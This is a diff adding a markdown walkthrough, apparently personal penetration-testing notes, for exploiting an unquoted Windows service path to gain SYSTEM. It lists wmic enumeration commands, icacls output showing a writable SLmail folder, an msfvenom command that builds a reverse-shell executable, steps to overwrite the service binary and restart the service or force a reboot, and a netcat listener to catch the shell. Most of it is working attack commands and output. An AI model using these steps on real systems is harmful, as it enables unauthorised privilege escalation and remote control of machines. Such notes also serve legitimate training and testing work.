@@ -1,0 +1,49 @@
+## Step by step Unquoted Service Path exploitation
+NOTE: Cant restart service? no problem - run shutdown /r and wait for shell :)
+1. wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
+
+OR
+
+1. wmic service get name,pathname
+
+2. Look for unquoted paths with spaces like  C:\Program Files\SLmail\SLmail.exe
+
+3. We check what its privileges are - wmic service get pathname,startname
+
+4. At this step try to start or stop the service if possible -
+
+ sc start SLmail
+
+ OR
+
+ net start SLmail
+
+ Ignore it if you get access is denied and LOOK FOR ANOTHER PROCESS
+
+4. Now we see its running as local system so we go to its path and do icacls on our possible choices one by one
+
+5. Once we see
+C:\Users\hackme\Downloads\netcat-win32-1.11\netcat-1.11>icacls "C:\Program Files\SLmail"
+icacls "C:\Program Files\SLmail"
+C:\Program Files\SLmail BUILTIN\Users:(OI)(CI)(W)
+                        NT SERVICE\TrustedInstaller:(I)(F)
+                        NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                        NT AUTHORITY\SYSTEM:(I)(F)
+                        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                        BUILTIN\Administrators:(I)(F)
+                        BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                        BUILTIN\Users:(I)(RX)
+                        BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                        CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+6. We are a builtin user and we see we have a 'W' in permissions so we can write to it.
+
+7. Create a malicious exe - msfvenom -p windows/shell_reverse_tcp LHOST=<IP ADDRESS> LPORT=443 -f exe -o SLmail.exe
+
+NOTE : We can create/place it anywhere in the path : C:\Users\hackme.exe or C:\Users.exe or C:\Users\hackme\Downloads.exe and so on...
+
+9. Now we overwrite it using COPY "source" "destination" amd say YES to overwrite
+
+10. Now we restart the service with our netcat listener ready to catch the shell.
